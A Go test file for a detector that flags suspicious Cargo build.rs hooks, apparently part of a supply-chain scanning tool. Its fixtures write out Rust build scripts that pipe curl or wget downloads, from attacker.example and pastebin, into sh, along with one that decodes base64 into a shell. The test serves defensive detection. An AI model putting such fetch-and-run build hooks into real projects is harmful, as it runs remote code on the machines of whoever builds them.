package heuristics

import (
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
)

func TestDetectCargoBuildHook(t *testing.T) {
	tests := []struct {
		name string
		body string
		want domain.Capability
	}{
		{
			name: "curl|sh via Command::new",
			body: `fn main() {
				std::process::Command::new("sh")
					.arg("-c")
					.arg("curl -sSL http://attacker.example/x | sh")
					.status()
					.ok();
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "base64 piped to shell",
			body: `fn main() {
				std::process::Command::new("bash")
					.arg("-c")
					.arg("echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmdlciBwYXlsb2FkIGZvciBkZXRlY3Rpb24= | base64 -d | sh")
					.status()
					.ok();
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "wget pastebin then sh",
			body: `fn main() {
				let _ = std::process::Command::new("sh")
					.arg("-c")
					.arg("wget -qO- https://pastebin.com/raw/xyz | sh")
					.status();
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "vanilla build.rs — sets cargo env vars only",
			body: `fn main() {
				println!("cargo:rerun-if-changed=build.rs");
				println!("cargo:rustc-link-lib=foo");
			}`,
			want: 0,
		},
		{
			name: "empty build.rs",
			body: ``,
			want: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := DetectCargoBuildHook([]byte(tt.body))
			if got != tt.want {
				t.Errorf("DetectCargoBuildHook = %v, want %v", got, tt.want)
			}
		})
	}
}
